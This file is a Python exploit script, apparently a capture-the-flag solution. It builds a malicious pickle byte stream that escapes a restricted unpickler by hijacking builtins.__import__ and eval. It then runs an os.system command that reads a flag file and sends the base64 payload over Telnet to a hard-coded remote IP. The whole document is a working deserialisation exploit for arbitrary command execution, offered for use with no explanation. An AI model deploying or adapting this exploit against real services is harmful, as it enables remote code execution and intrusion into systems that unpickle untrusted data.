import codecs
from telnetlib import Telnet


p  = b''
p += b'\x80\x03'                   # protocol: 3
p += b'cstructs\n__dict__\n'         # from structs import __dict__
p += b'q\x00'                      # memo[0] = __dict__
p += b'cstructs\n__builtins__\n'     # from structs import __builtins__
p += b'q\x01'                      # memo[1] = builtins
p += b'cstructs\n__getattribute__\n' # from structs import __getattribute__
p += b'q\x02'                      # memo[2] = structs.__getattribute__

p += b'h\x01S"__import__"\nh\x02s' # builtins['__import__'] = structs.__getattribute__

p += b'h\x00S"structs"\nh\x01s'      # structs.structs = builtins
p += b'cstructs\nget\n'              # push builtins.get
p += b'q\x03'                      # memo[3] = builtins.get

p += b'h\x03S"eval"\n\x85R'        # push builtins.eval
p += b'q\x04'                      # memo[4] = builtins['eval']

# payload is execute under the context of securePickle.
# You can verified this by sending 'globals()' as payload.
payload = "pickle.sys.modules['os'].system('cat ../flag.txt')"
payload = repr(payload).encode('ascii')
p += b'S' + payload + b'\n'        # push payload
p += b'\x85R'                      # eval(payload)

p += b'.'                          # End

p = codecs.encode(p, 'base64')
p = p.replace(b'\n', b'')


# r = Telnet('localhost', 5422)
r = Telnet('34.204.204.172', 5422)
r.write(p + b'\n')
r.interact()

